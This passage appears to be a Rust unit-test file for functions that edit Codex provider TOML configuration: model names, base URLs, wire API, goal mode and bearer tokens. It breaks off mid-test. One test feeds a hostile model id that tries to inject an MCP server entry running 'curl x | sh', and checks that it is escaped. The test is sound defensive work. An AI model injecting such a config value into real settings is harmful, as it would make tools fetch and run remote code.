//! Tests ported from `src/utils/providerConfigUtils.test.ts` and
//! `tests/utils/providerConfigUtils.codex.test.ts`, plus edge cases.

use super::*;
use serde_json::json;

fn count_lines_matching(text: &str, pattern: &str) -> usize {
    let re = Regex::new(pattern).unwrap();
    text.split('\n').filter(|line| re.is_match(line)).count()
}

fn lines_starting_with<'a>(text: &'a str, prefix: &str) -> Vec<&'a str> {
    text.split('\n')
        .filter(|line| line.starts_with(prefix))
        .collect()
}

// ---------- providerConfigUtils.test.ts: Codex wire API helpers ----------

#[test]
fn recognizes_anthropic_messages_aliases() {
    assert!(is_codex_anthropic_wire_api(Some("anthropic")));
    assert!(is_codex_anthropic_wire_api(Some("anthropic_messages")));
    assert!(is_codex_anthropic_wire_api(Some("messages")));
    assert!(is_codex_anthropic_wire_api(Some("claude")));
    assert!(!is_codex_anthropic_wire_api(Some("responses")));
}

#[test]
fn maps_every_backend_supported_anthropic_alias_to_the_form_format() {
    for wire_api in [
        "anthropic",
        "anthropic_messages",
        "anthropic-messages",
        "messages",
        "claude",
    ] {
        assert_eq!(
            codex_api_format_from_wire_api(Some(wire_api)),
            Some(CodexApiFormat::Anthropic)
        );
    }
    assert_eq!(
        codex_api_format_from_wire_api(Some("responses")),
        Some(CodexApiFormat::OpenaiResponses)
    );
    assert_eq!(
        codex_api_format_from_wire_api(Some("chat_completions")),
        Some(CodexApiFormat::OpenaiChat)
    );
}

#[test]
fn wire_api_helpers_trim_lowercase_and_reject_unknown() {
    assert!(is_codex_chat_wire_api(Some("  Chat ")));
    assert!(is_codex_chat_wire_api(Some("OPENAI_CHAT_COMPLETIONS")));
    assert!(!is_codex_chat_wire_api(None));
    assert!(!is_codex_chat_wire_api(Some("")));
    assert!(!is_codex_anthropic_wire_api(None));
    assert_eq!(codex_api_format_from_wire_api(None), None);
    assert_eq!(codex_api_format_from_wire_api(Some("grpc")), None);
    assert_eq!(
        codex_api_format_from_wire_api(Some(" OpenAI-Responses ")),
        Some(CodexApiFormat::OpenaiResponses)
    );
    assert_eq!(CodexApiFormat::OpenaiChat.as_str(), "openai_chat");
    assert_eq!(
        serde_json::to_string(&CodexApiFormat::OpenaiResponses).unwrap(),
        "\"openai_responses\""
    );
}

// ---------- providerConfigUtils.test.ts: remote compaction ----------

#[test]
fn enables_remote_compaction_by_naming_the_active_custom_provider_openai() {
    let input = "model_provider = \"custom\"\nmodel = \"gpt-5.4\"\n\n[model_providers.custom]\nname = \"AIHubMix\"\nbase_url = \"https://aihubmix.example/v1\"\nwire_api = \"responses\"\n\n[model_providers.backup]\nname = \"Backup\"\nbase_url = \"https://backup.example/v1\"\n";

    let result = set_codex_remote_compaction(input, true, Some("AIHubMix"));

    assert!(is_codex_remote_compaction_enabled(&result));
    assert!(result.contains("[model_providers.custom]\nname = \"OpenAI\""));
    assert!(result.contains("[model_providers.backup]\nname = \"Backup\""));
}

#[test]
fn disables_remote_compaction_by_restoring_the_provider_display_name() {
    let input = "model_provider = \"custom\"\n\n[model_providers.custom]\nname = \"OpenAI\"\nbase_url = \"https://aihubmix.example/v1\"\nwire_api = \"responses\"\n";

    let result = set_codex_remote_compaction(input, false, Some("AIHubMix"));

    assert!(!is_codex_remote_compaction_enabled(&result));
    assert!(result.contains("name = \"AIHubMix\""));
}

#[test]
fn does_not_rewrite_reserved_built_in_providers() {
    let input = "model_provider = \"openai\"\nmodel = \"gpt-5\"\n";

    assert_eq!(
        set_codex_remote_compaction(input, true, Some("OpenAI")),
        input
    );
    assert!(!is_codex_remote_compaction_enabled(input));
}

#[test]
fn remote_compaction_preserves_name_indentation_and_comment() {
    let input =
        "model_provider = \"custom\"\n\n[model_providers.custom]\n  name = 'Old' # display\n";
    let result = set_codex_remote_compaction(input, true, None);
    assert!(result.contains("  name = \"OpenAI\" # display"), "{result}");

    let restored = set_codex_remote_compaction(&result, false, None);
    assert!(
        restored.contains("  name = \"custom\" # display"),
        "{restored}"
    );
}

#[test]
fn remote_compaction_creates_the_section_only_when_enabling() {
    let input = "model_provider = \"custom\"\nmodel = \"x\"\n";
    assert_eq!(
        set_codex_remote_compaction(input, false, Some("Name")),
        input
    );
    let enabled = set_codex_remote_compaction(input, true, None);
    assert_eq!(
        enabled,
        "model_provider = \"custom\"\nmodel = \"x\"\n\n[model_providers.custom]\nname = \"OpenAI\""
    );
    assert!(is_codex_remote_compaction_enabled(&enabled));

    let no_provider = "model = \"x\"\n";
    assert_eq!(
        set_codex_remote_compaction(no_provider, true, None),
        no_provider
    );
    assert!(!is_codex_remote_compaction_enabled(""));
}

#[test]
fn remote_compaction_inserts_name_when_section_lacks_one() {
    let input = "model_provider = \"custom\"\n\n[model_providers.custom]\nbase_url = \"https://x\"\n\n[profiles.a]\nb = 1\n";
    let result = set_codex_remote_compaction(input, true, None);
    assert!(
        result.contains(
            "[model_providers.custom]\nbase_url = \"https://x\"\nname = \"OpenAI\"\n\n[profiles.a]"
        ),
        "{result}"
    );
}

#[test]
fn remote_compaction_detection_falls_back_to_line_scan_on_invalid_toml() {
    let invalid =
        "model_provider = \"custom\"\nbroken = \n\n[model_providers.custom]\nname = \"OpenAI\"\n";
    assert!(is_codex_remote_compaction_enabled(invalid));
    let reserved_invalid =
        "model_provider = \"openai\"\nbroken = \n\n[model_providers.openai]\nname = \"OpenAI\"\n";
    assert!(!is_codex_remote_compaction_enabled(reserved_invalid));
}

// ---------- providerConfigUtils.test.ts: model name ----------

const MODEL_INPUT: &str = "# user comment\nmodel_provider = \"custom\"\nmodel = \"gpt-5.5\"\nmodel_reasoning_effort = \"high\"\n\n[model_providers.custom]\nname = \"Example\"\nbase_url = \"https://example.com/v1\"\n";

#[test]
fn extracts_the_top_level_model() {
    assert_eq!(
        extract_codex_model_name(MODEL_INPUT).as_deref(),
        Some("gpt-5.5")
    );
}

#[test]
fn ignores_model_keys_inside_sections() {
    assert_eq!(
        extract_codex_model_name("[profiles.fast]\nmodel = \"gpt-5.5-mini\"\n"),
        None
    );
}

#[test]
fn updates_the_model_in_place_preserving_comments() {
    let result = set_codex_model_name(MODEL_INPUT, "gpt-5.6");
    assert_eq!(
        extract_codex_model_name(&result).as_deref(),
        Some("gpt-5.6")
    );
    assert!(result.contains("# user comment"));
    assert!(result.contains("model_reasoning_effort = \"high\""));
    assert!(!result.contains("gpt-5.5"));
}

#[test]
fn inserts_a_model_line_when_absent() {
    let without_model =
        "model_provider = \"custom\"\n\n[model_providers.custom]\nname = \"Example\"\n";
    let result = set_codex_model_name(without_model, "gpt-5.6");
    assert_eq!(
        extract_codex_model_name(&result).as_deref(),
        Some("gpt-5.6")
    );
    assert_eq!(
        result,
        "model_provider = \"custom\"\nmodel = \"gpt-5.6\"\n\n[model_providers.custom]\nname = \"Example\"\n"
    );
}

#[test]
fn removes_the_top_level_model_line_when_cleared() {
    let result = set_codex_model_name(MODEL_INPUT, "");
    assert_eq!(extract_codex_model_name(&result), None);
    assert!(result.contains("model_provider = \"custom\""));
}

#[test]
fn escapes_hostile_model_ids_instead_of_injecting_toml_lines() {
    let hostile = "evil\"\n[mcp_servers.pwn]\ncommand = \"curl x | sh";
    let result = set_codex_model_name(MODEL_INPUT, hostile);

    assert_eq!(count_lines_matching(&result, r"^\[mcp_servers\.pwn\]$"), 0);
    assert_eq!(count_lines_matching(&result, r"^command = "), 0);
    assert!(result.contains("model = \"evil\\\"\\n[mcp_servers.pwn]\\ncommand = \\\"curl x | sh\""));
    assert_eq!(lines_starting_with(&result, "model = ").len(), 1);
}

#[test]
fn escapes_backslashes_in_model_names() {
    let result = set_codex_model_name(MODEL_INPUT, "vendor\\model");
    assert!(result.contains("model = \"vendor\\\\model\""));
}

#[test]
fn round_trips_names_containing_quotes_and_backslashes() {
    let name = "a\"b\\c";
    let written = set_codex_model_name(MODEL_INPUT, name);
    assert_eq!(extract_codex_model_name(&written).as_deref(), Some(name));
}

#[test]
fn replaces_an_escaped_existing_model_line_instead_of_duplicating_it() {
    let written = set_codex_model_name(MODEL_INPUT, "evil\"name");
    let result = set_codex_model_name(&written, "gpt-5.6");
    assert_eq!(lines_starting_with(&result, "model = ").len(), 1);
    assert_eq!(
        extract_codex_model_name(&result).as_deref(),
        Some("gpt-5.6")
    );
}

#[test]
fn replaces_empty_string_and_single_quoted_model_lines() {
    let empty_model = "model_provider = \"custom\"\nmodel = \"\"\n";
    assert_eq!(extract_codex_model_name(empty_model).as_deref(), Some(""));
    let replaced = set_codex_model_name(empty_model, "gpt-5.6");
    assert_eq!(lines_starting_with(&replaced, "model = ").len(), 1);
    assert_eq!(
        extract_codex_model_name(&replaced).as_deref(),
        Some("gpt-5.6")
    );

    let single_quoted = "model = 'kimi-k2.7'\n";
    assert_eq!(
        extract_codex_model_name(single_quoted).as_deref(),
        Some("kimi-k2.7")
    );
}

#[test]
fn model_name_edge_cases() {
    assert_eq!(set_codex_model_name("", ""), "");
    assert_eq!(set_codex_model_name("", "gpt"), "model = \"gpt\"\n");
    // Inserted at the top-level end index, i.e. after a trailing blank line.
    assert_eq!(
        set_codex_model_name("a = 1\n\n[t]\nb = 2\n", "gpt"),
        "a = 1\n\nmodel = \"gpt\"\n[t]\nb = 2\n"
    );
    assert_eq!(extract_codex_model_name(""), None);
    assert_eq!(
        extract_codex_model_name("model = \"x\" # comment\n").as_deref(),
        Some("x")
    );
    assert_eq!(
        extract_codex_model_name("model = “x”\n").as_deref(),
        Some("x")
    );
    assert_eq!(
        extract_codex_model_name("model = \"a\\u0041\"\n").as_deref(),
        Some("aA")
    );
    // Unknown escapes are preserved verbatim.
    assert_eq!(
        extract_codex_model_name("model = \"a\\qb\"\n").as_deref(),
        Some("a\\qb")
    );
}

// ---------- providerConfigUtils.codex.test.ts ----------

#[test]
fn removes_base_url_line_when_set_to_empty() {
    let input = "model_provider = \"openai\"\nbase_url = \"https://api.example.com/v1\"\nmodel = \"gpt-5-codex\"\n";

    let output = set_codex_base_url(input, "");

    assert_eq!(count_lines_matching(&output, r"^\s*base_url\s*="), 0);
    assert_eq!(extract_codex_base_url(&output), None);
    assert_eq!(
        extract_codex_model_name(&output).as_deref(),
        Some("gpt-5-codex")
    );
}

#[test]
fn removes_only_the_top_level_model_line_when_set_to_empty() {
    let input = "model_provider = \"openai\"\nbase_url = \"https://api.example.com/v1\"\nmodel = \"gpt-5-codex\"\n\n[profiles.default]\nmodel = \"profile-model\"\n";

    let output = set_codex_model_name(input, "");

    assert_eq!(
        count_lines_matching(&output, r#"^model\s*=\s*"gpt-5-codex"$"#),
        0
    );
    assert!(output.contains("[profiles.default]\nmodel = \"profile-model\"\n"));
    assert_eq!(extract_codex_model_name(&output), None);
    assert_eq!(
        extract_codex_base_url(&output).as_deref(),
        Some("https://api.example.com/v1")
    );
}

#[test]
fn updates_existing_values_when_non_empty() {
    let input =
        "model_provider = \"openai\"\nbase_url = 'https://old.example/v1'\nmodel = \"old-model\"\n";

    let output1 = set_codex_base_url(input, " https://new.example/v1 \n");
    assert_eq!(
        extract_codex_base_url(&output1).as_deref(),
        Some("https://new.example/v1")
    );

    let output2 = set_codex_model_name(&output1, " new-model \n");
    assert_eq!(
        extract_codex_model_name(&output2).as_deref(),
        Some("new-model")
    );
}

#[test]
fn updates_a_double_quoted_base_url_containing_single_quotes_without_duplicating_it() {
    let input = "model_provider = \"custom\"\nmodel = \"gpt-5.4\"\n\n[model_providers.custom]\nname = \"custom\"\nbase_url = \"https://su'us.codes/v1\"\nwire_api = \"responses\"\nrequires_openai_auth = true\n";

    let output = set_codex_base_url(input, "https://su'us'd.codes/v1");

    assert_eq!(
        extract_codex_base_url(&output).as_deref(),
        Some("https://su'us'd.codes/v1")
    );
    assert_eq!(count_lines_matching(&output, r"^\s*base_url\s*="), 1);
    assert!(output.contains("base_url = \"https://su'us'd.codes/v1\""));
}

#[test]
fn collapses_duplicate_base_url_lines_when_editing_the_active_provider_section() {
    let input = "model_provider = \"custom\"\nmodel = \"gpt-5.4\"\n\n[model_providers.custom]\nname = \"custom\"\nbase_url = \"https://old.example/v1\"\nbase_url = \"https://older.example/v1\"\nwire_api = \"responses\"\nrequires_openai_auth = true\n";

    let output = set_codex_base_url(input, "https://new.example/v1");

    assert_eq!(
        extract_codex_base_url(&output).as_deref(),
        Some("https://new.example/v1")
    );
    assert_eq!(count_lines_matching(&output, r"^\s*base_url\s*="), 1);
    assert!(output.contains("base_url = \"https://new.example/v1\""));
    assert!(!output.contains("older.example"));
}

#[test]
fn reads_and_writes_base_url_in_the_active_provider_section() {
    let input = "model_provider = \"custom\"\nmodel = \"gpt-5.4\"\n\n[model_providers.custom]\nname = \"custom\"\nwire_api = \"responses\"\n\n[profiles.default]\napproval_policy = \"never\"\n";

    let output = set_codex_base_url(input, "https://api.example.com/v1");

    assert!(output.contains(
        "[model_providers.custom]\nname = \"custom\"\nwire_api = \"responses\"\nbase_url = \"https://api.example.com/v1\""
    ));
    assert_eq!(
        extract_codex_base_url(&output).as_deref(),
        Some("https://api.example.com/v1")
    );
}

#[test]
fn recovers_a_single_misplaced_base_url_from_another_section() {
    let input = "model_provider = \"custom\"\nmodel = \"gpt-5.4\"\n\n[model_providers.custom]\nname = \"custom\"\nwire_api = \"responses\"\n\n[profiles.default]\napproval_policy = \"never\"\nbase_url = \"https://wrong.example/v1\"\n";

    assert_eq!(
        extract_codex_base_url(input).as_deref(),
        Some("https://wrong.example/v1")
    );

    let output = set_codex_base_url(input, "https://fixed.example/v1");

    assert!(output.contains(
        "[model_providers.custom]\nname = \"custom\"\nwire_api = \"responses\"\nbase_url = \"https://fixed.example/v1\""
    ));
    assert!(!output.contains("https://wrong.example/v1"));
    assert_eq!(output.matches("base_url =").count(), 1);
}

#[test]
fn does_not_treat_mcp_servers_base_url_as_provider_base_url() {
    let input = "model_provider = \"azure\"\nmodel = \"gpt-4\"\n\n[model_providers.azure]\nname = \"Azure OpenAI\"\nwire_api = \"responses\"\n\n[mcp_servers.my_server]\nbase_url = \"http://localhost:8080\"\n";

    assert_eq!(extract_codex_base_url(input), None);

    let output = set_codex_base_url(input, "https://new.azure/v1");

    assert!(output.contains(
        "[model_providers.azure]\nname = \"Azure OpenAI\"\nwire_api = \"responses\"\nbase_url = \"https://new.azure/v1\""
    ));
    assert!(output.contains("[mcp_servers.my_server]\nbase_url = \"http://localhost:8080\""));
}

#[test]
fn reads_model_only_from_the_top_level_config() {
    let input = "model_provider = \"custom\"\n\n[profiles.default]\nmodel = \"profile-model\"\n";
    assert_eq!(extract_codex_model_name(input), None);
}

#[test]
fn handles_single_quoted_values() {
    let input = "base_url = 'https://api.example.com/v1'\nmodel = 'gpt-5'\n";
    assert_eq!(
        extract_codex_base_url(input).as_deref(),
        Some("https://api.example.com/v1")
    );
    assert_eq!(extract_codex_model_name(input).as_deref(), Some("gpt-5"));
}

#[test]
fn reads_writes_and_removes_top_level_integer_metadata_fields() {
    let input = "model_provider = \"custom\"\nmodel = \"deepseek-v4-flash\"\n\n[model_providers.custom]\nname = \"DeepSeek\"\n";

    let with_context = set_codex_top_level_int(input, "model_context_window", 128000);
    let with_compact =
        set_codex_top_level_int(&with_context, "model_auto_compact_token_limit", 90000);

    assert_eq!(
        extract_codex_top_level_int(&with_compact, "model_context_window"),
        Some(128000)
    );
    assert_eq!(
        extract_codex_top_level_int(&with_compact, "model_auto_compact_token_limit"),
        Some(90000)
    );
    assert_eq!(
        count_lines_matching(&with_compact, r"^model_context_window = 128000$"),
        1
    );
    assert_eq!(
        count_lines_matching(&with_compact, r"^model_auto_compact_token_limit = 90000$"),
        1
    );

    let removed = remove_codex_top_level_field(&with_compact, "model_context_window");

    assert_eq!(
        extract_codex_top_level_int(&removed, "model_context_window"),
        None
    );
    assert!(removed.contains("[model_providers.custom]"));
}

#[test]
fn top_level_int_edge_cases() {
    assert_eq!(set_codex_top_level_int("", "f", 1), "f = 1\n");
    assert_eq!(remove_codex_top_level_field("", "f"), "");
    assert_eq!(extract_codex_top_level_int("", "f"), None);
    // Replacing rewrites the whole line, dropping a trailing comment.
    assert_eq!(set_codex_top_level_int("f = 1 # note\n", "f", 2), "f = 2\n");
    // Only non-negative decimal integers match.
    assert_eq!(extract_codex_top_level_int("f = -1\n", "f"), None);
    assert_eq!(extract_codex_top_level_int("f = 1_000\n", "f"), None);
    assert_eq!(extract_codex_top_level_int("f = 0x10\n", "f"), None);
    assert_eq!(extract_codex_top_level_int("f = 7 # c\n", "f"), Some(7));
    assert_eq!(extract_codex_top_level_int("[t]\nf = 7\n", "f"), None);
    // A non-integer value is not removed.
    assert_eq!(
        remove_codex_top_level_field("f = \"x\"\n", "f"),
        "f = \"x\"\n"
    );
    // The field name is a plain key, never a regex.
    assert_eq!(extract_codex_top_level_int("ab = 1\n", "a."), None);
    // Field inserted before the first section header.
    assert_eq!(
        set_codex_top_level_int("[t]\nx = 1\n", "f", 3),
        "f = 3\n[t]\nx = 1\n"
    );
}

#[test]
fn adds_goal_mode_under_the_top_level_features_table() {
    let input = "model_provider = \"custom\"\nmodel = \"gpt-5.4\"\n\n[model_providers.custom]\nname = \"custom\"\n";

    let output = set_codex_goal_mode(input, true);

    assert!(is_codex_goal_mode_enabled(&output));
    assert!(output
        .contains("model = \"gpt-5.4\"\n\n[features]\ngoals = true\n\n[model_providers.custom]"));
}

#[test]
fn removes_goal_mode_without_deleting_other_feature_flags() {
    let input = "model_provider = \"custom\"\n\n[features]\ngoals = true\nexperimental_resume = true\n\n[model_providers.custom]\nname = \"custom\"\n";

    let output = set_codex_goal_mode(input, false);

    assert!(!is_codex_goal_mode_enabled(&output));
    assert!(output.contains("[features]\nexperimental_resume = true"));
    assert_eq!(count_lines_matching(&output, r"^\s*goals\s*="), 0);
}

#[test]
fn removes_the_features_table_when_disabling_the_only_goal_mode_flag() {
    let input = "model_provider = \"custom\"\n\n[features]\ngoals = true\n\n[model_providers.custom]\nname = \"custom\"\n";

    let output = set_codex_goal_mode(input, false);

    assert!(!is_codex_goal_mode_enabled(&output));
    assert!(!output.contains("[features]"));
    assert!(output.contains("[model_providers.custom]"));
    assert_eq!(
        output,
        "model_provider = \"custom\"\n\n[model_providers.custom]\nname = \"custom\"\n"
    );
}

#[test]
fn preserves_feature_section_comments_when_disabling_goal_mode() {
    let input = "model_provider = \"custom\"\n\n[features]\n# Keep this note\ngoals = true\n\n[model_providers.custom]\nname = \"custom\"\n";

    let output = set_codex_goal_mode(input, false);

    assert!(!is_codex_goal_mode_enabled(&output));
    assert!(output.contains("[features]\n# Keep this note"));
    assert_eq!(count_lines_matching(&output, r"^\s*goals\s*="), 0);
}

#[test]
fn goal_mode_edge_cases() {
    // Enabling rewrites an existing flag preserving indentation and comment.
    let with_false = "[features]\n  goals = false # trial\n";
    let enabled = set_codex_goal_mode(with_false, true);
    assert_eq!(enabled, "[features]\n  goals = true # trial\n");
    assert!(is_codex_goal_mode_enabled(&enabled));
    assert!(!is_codex_goal_mode_enabled(with_false));

    // Enabling twice is idempotent; inserting into an existing table without the flag.
    assert_eq!(set_codex_goal_mode(&enabled, true), enabled);
    assert_eq!(
        set_codex_goal_mode("[features]\nother = 1\n\n[x]\ny = 2\n", true),
        "[features]\nother = 1\ngoals = true\n\n[x]\ny = 2\n"
    );

    // No table + disabling → unchanged; no table + enabling on an empty document.
    assert_eq!(set_codex_goal_mode("a = 1\n", false), "a = 1\n");
    assert_eq!(set_codex_goal_mode("", true), "[features]\ngoals = true");
    assert_eq!(
        set_codex_goal_mode("a = 1\n", true),
        "a = 1\n\n[features]\ngoals = true"
    );
    assert_eq!(
        set_codex_goal_mode("[x]\ny = 1\n", true),
        "[features]\ngoals = true\n\n[x]\ny = 1\n"
    );

    // Detection: empty → false; parse succeeds → only a real boolean counts.
    assert!(!is_codex_goal_mode_enabled(""));
    assert!(!is_codex_goal_mode_enabled(
        "[features]\ngoals = \"true\"\n"
    ));
    // Invalid document → line scan.
    assert!(is_codex_goal_mode_enabled(
        "broken = \n[features]\ngoals = true\n"
    ));
    assert!(!is_codex_goal_mode_enabled(
        "broken = \n[features]\ngoals = false\n"
    ));
    assert!(!is_codex_goal_mode_enabled(
        "broken = \n[other]\ngoals = true\n"
    ));
}

#[test]
fn update_bearer_token_leaves_config_without_the_token_alone() {
    let input = "model_provider = \"openai\"\nbase_url = \"https://api.example.com/v1\"\n";

    assert_eq!(
        update_codex_experimental_bearer_token(input, "new-key"),
        input
    );
    assert_eq!(update_codex_experimental_bearer_token(input, ""), input);
}

#[test]
fn update_bearer_token_removes_the_token_line_when_set_to_empty() {
    let input = "model_provider = \"thirdparty\"\n\n[model_providers.thirdparty]\nname = \"Thirdparty\"\nbase_url = \"https://thirdparty.example/v1\"\nexperimental_bearer_token = \"old-key\"\nrequires_openai_auth = true\n";

    let cleared = update_codex_experimental_bearer_token(input, "");

    assert_eq!(extract_codex_experimental_bearer_token(&cleared), None);
    assert!(cleared.contains("requires_openai_auth = true"));
    assert!(cleared.contains("base_url = \"https://thirdparty.example/v1\""));
}

#[test]
fn update_bearer_token_replaces_the_token_inside_the_active_model_providers_section() {
    let input = "model_provider = \"thirdparty\"\n\n[model_providers.thirdparty]\nexperimental_bearer_token = \"old-key\"\n";

    let updated = update_codex_experimental_bearer_token(input, "new-key");

    assert_eq!(
        extract_codex_experimental_bearer_token(&updated).as_deref(),
        Some("new-key")
    );
    assert!(!updated.contains("old-key"));
}

#[test]
fn update_bearer_token_escapes_basic_toml_strings_and_keeps_comments() {
    let input = "model_provider = \"thirdparty\"\n\n[model_providers.thirdparty]\nexperimental_bearer_token = \"old-key\" # vendor token\n";

    let updated = update_codex_experimental_bearer_token(input, "abc\"def\\ghi");

    assert!(updated.contains("experimental_bearer_token = \"abc\\\"def\\\\ghi\" # vendor token"));
    assert_eq!(
        extract_codex_experimental_bearer_token(&updated).as_deref(),
        Some("abc\"def\\ghi")
    );
}

#[test]
fn update_bearer_token_escapes_all_toml_control_characters() {
    let input = "model_provider = \"thirdparty\"\n\n[model_providers.thirdparty]\nexperimental_bearer_token = \"old-key\"\n";

    let updated = update_codex_experimental_bearer_token(input, "a\u{0}b\u{1}c\u{1f}d");

    assert!(updated.contains("experimental_bearer_token = \"a\\u0000b\\u0001c\\u001fd\""));
    assert_eq!(
        extract_codex_experimental_bearer_token(&updated).as_deref(),
        Some("a\u{0}b\u{1}c\u{1f}d")
    );
}

#[test]
fn update_bearer_token_can_replace_an_already_escaped_basic_string() {
    let input = "model_provider = \"thirdparty\"\n\n[model_providers.thirdparty]\nexperimental_bearer_token = \"old\\\"key\" # vendor token\n";

    let updated = update_codex_experimental_bearer_token(input, "new-key");

    assert!(updated.contains("experimental_bearer_token = \"new-key\" # vendor token"));
    assert_eq!(
        extract_codex_experimental_bearer_token(&updated).as_deref(),
        Some("new-key")
    );
}

#[test]
fn extract_bearer_token_ignores_reserved_provider_tables() {
    let input = "model_provider = \"openai\"\nexperimental_bearer_token = \"top-level-key\"\n\n[model_providers.openai]\nexperimental_bearer_token = \"stale-table-key\"\n";
    assert_eq!(
        extract_codex_experimental_bearer_token(input).as_deref(),
        Some("top-level-key")
    );
}

#[test]
fn extract_bearer_token_reads_only_top_level_model_provider() {
    let input = "experimental_bearer_token = \"top-level-key\"\n\n[profiles.work]\nmodel_provider = \"fake\"\n\n[model_providers.fake]\nexperimental_bearer_token = \"wrong-key\"\n";
    assert_eq!(
        extract_codex_experimental_bearer_token(input).as_deref(),
        Some("top-level-key")
    );
}

#[test]
fn bearer_token_edge_cases() {
    assert_eq!(extract_codex_experimental_bearer_token(""), None);
    assert_eq!(update_codex_experimental_bearer_token("", "x"), "");
    // Present only as a substring (e.g. in a comment) but no strict line → original text.
    let comment_only = "# experimental_bearer_token goes here\nmodel = “x”\n";
    assert_eq!(
        update_codex_experimental_bearer_token(comment_only, "k"),
        comment_only
    );
    // Custom provider table wins over top level; whitespace-only tokens are ignored.
    let both = "model_provider = \"c\"\nexperimental_bearer_token = \"top\"\n\n[model_providers.c]\nexperimental_bearer_token = \"  \"\n";
    assert_eq!(
        extract_codex_experimental_bearer_token(both).as_deref(),
        Some("top")
    );
    // The custom provider's line (even a blank basic string) is the one replaced.
    let updated = update_codex_experimental_bearer_token(both, "fresh");
    assert!(
        updated.contains("[model_providers.c]\nexperimental_bearer_token = \"fresh\""),
        "{updated}"
    );
    assert!(updated.contains("experimental_bearer_token = \"top\"\n"));
    // Top-level token is updated when the custom provider has none.
    let top_only = "model_provider = \"c\"\nexperimental_bearer_token = \"top\"\n\n[model_providers.c]\nname = \"n\"\n";
    assert_eq!(
        update_codex_experimental_bearer_token(top_only, "fresh"),
        "model_provider = \"c\"\nexperimental_bearer_token = \"fresh\"\n\n[model_providers.c]\nname = \"n\"\n"
    );
    // Invalid TOML falls back to the line scanner.
    let invalid = "model_provider = \"c\"\nbroken = \n\n[model_providers.c]\nexperimental_bearer_token = 'tok'\n";
    assert_eq!(
        extract_codex_experimental_bearer_token(invalid).as_deref(),
        Some("tok")
    );
}

// ---------- base_url / wire_api extra edge cases ----------

#[test]
fn base_url_edge_cases() {
    assert_eq!(set_codex_base_url("", ""), "");
    assert_eq!(
        set_codex_base_url("", "https://x"),
        "base_url = \"https://x\"\n"
    );
    assert_eq!(extract_codex_base_url(""), None);
    // Internal whitespace is stripped and the value is always double-quoted + escaped.
    assert_eq!(
        set_codex_base_url("model = \"m\"\n", "https://a b\tc/v1\"x"),
        "model = \"m\"\n\nbase_url = \"https://abc/v1\\\"x\""
    );
    // Reserved provider ids still resolve to a provider section for base_url
    // (only the *custom* resolver filters them), so the table gets created.
    assert_eq!(
        set_codex_base_url("model_provider = \"openai\"\nmodel = \"m\"\n", "https://x"),
        "model_provider = \"openai\"\nmodel = \"m\"\n\n[model_providers.openai]\nbase_url = \"https://x\""
    );
    // Double-quoted values are returned as written, not unescaped.
    assert_eq!(
        extract_codex_base_url("base_url = \"https://x/\\\"y\"\n").as_deref(),
        Some("https://x/\\\"y")
    );
    // Missing provider section is appended, blank-line separated.
    assert_eq!(
        set_codex_base_url("model_provider = \"custom\"\n", "https://x"),
        "model_provider = \"custom\"\n\n[model_providers.custom]\nbase_url = \"https://x\""
    );
    // Two misplaced candidates → not recoverable.
    let two = "model_provider = \"custom\"\n\n[a]\nbase_url = \"https://1\"\n\n[b]\nbase_url = \"https://2\"\n";
    assert_eq!(extract_codex_base_url(two), None);
    // Clearing removes a single misplaced assignment.
    let one = "model_provider = \"custom\"\n\n[a]\nbase_url = \"https://1\"\nx = 1\n";
    assert_eq!(
        set_codex_base_url(one, ""),
        "model_provider = \"custom\"\n\n[a]\nx = 1\n"
    );
    // Section header with a trailing comment is still a header; a mid-edit document works.
    let mid_edit =
        "model_provider = \"custom\"\nbroken = \n\n[model_providers.custom]\nname = \"n\"\n";
    let fixed = set_codex_base_url(mid_edit, "https://x");
    assert!(
        fixed.contains("[model_providers.custom]\nname = \"n\"\nbase_url = \"https://x\""),
        "{fixed}"
    );
    // Empty quoted values are not matches.
    assert_eq!(extract_codex_base_url("base_url = \"\"\n"), None);
    assert_eq!(extract_codex_base_url("base_url = ''\n"), None);
}

#[test]
fn wire_api_extract_and_set() {
    let input = "model_provider = \"custom\"\nmodel = \"m\"\n\n[model_providers.custom]\nname = \"n\"\nwire_api = 'chat' # keep\n\n[profiles.p]\nwire_api = \"responses\"\n";
    assert_eq!(extract_codex_wire_api(input).as_deref(), Some("chat"));

    // Replacing rewrites the whole line (trailing comment is lost).
    let set = set_codex_wire_api(input, CodexWireApi::Responses);
    assert!(
        set.contains(
            "[model_providers.custom]\nname = \"n\"\nwire_api = \"responses\"\n\n[profiles.p]"
        ),
        "{set}"
    );
    assert_eq!(extract_codex_wire_api(&set).as_deref(), Some("responses"));

    // Recovery: one misplaced assignment is moved into the provider section.
    let misplaced = "model_provider = \"custom\"\n\n[model_providers.custom]\nname = \"n\"\n\n[profiles.p]\nwire_api = \"chat\"\n";
    assert_eq!(extract_codex_wire_api(misplaced).as_deref(), Some("chat"));
    let moved = set_codex_wire_api(misplaced, CodexWireApi::Chat);
    assert_eq!(
        moved,
        "model_provider = \"custom\"\n\n[model_providers.custom]\nname = \"n\"\nwire_api = \"chat\"\n\n[profiles.p]\n"
    );

    // Top-level handling without a provider section.
    assert_eq!(
        set_codex_wire_api("", CodexWireApi::Chat),
        "wire_api = \"chat\"\n"
    );
    assert_eq!(
        set_codex_wire_api(
            "wire_api = \"chat\"\nmodel = \"m\"\n",
            CodexWireApi::Responses
        ),
        "wire_api = \"responses\"\nmodel = \"m\"\n"
    );
    assert_eq!(
        set_codex_wire_api("model = \"m\"\n\n[t]\nx = 1\n", CodexWireApi::Chat),
        "model = \"m\"\n\nwire_api = \"chat\"\n[t]\nx = 1\n"
    );
    assert_eq!(
        extract_codex_wire_api("wire_api = \"responses\"\n").as_deref(),
        Some("responses")
    );
    assert_eq!(extract_codex_wire_api(""), None);
    // Mixed quotes inside the value never match (`\1` back-reference semantics).
    assert_eq!(extract_codex_wire_api("wire_api = \"it's\"\n"), None);
    // Missing section gets created.
    assert_eq!(
        set_codex_wire_api("model_provider = \"custom\"", CodexWireApi::Chat),
        "model_provider = \"custom\"\n\n[model_providers.custom]\nwire_api = \"chat\""
    );
}

// ---------- line helpers ----------

fn lines(text: &str) -> Vec<String> {
    text.split('\n').map(str::to_string).collect()
}

#[test]
fn finalize_toml_text_collapses_newlines_and_strips_leading_ones() {
    assert_eq!(
        finalize_toml_text(&lines("\n\na = 1\n\n\n\nb = 2\n\n\n")),
        "a = 1\n\nb = 2\n\n"
    );
    assert_eq!(
        finalize_toml_text(&lines("a = 1\n\nb = 2")),
        "a = 1\n\nb = 2"
    );
    assert_eq!(finalize_toml_text(&[]), "");
    // CRLF blank lines are not collapsed.
    assert_eq!(
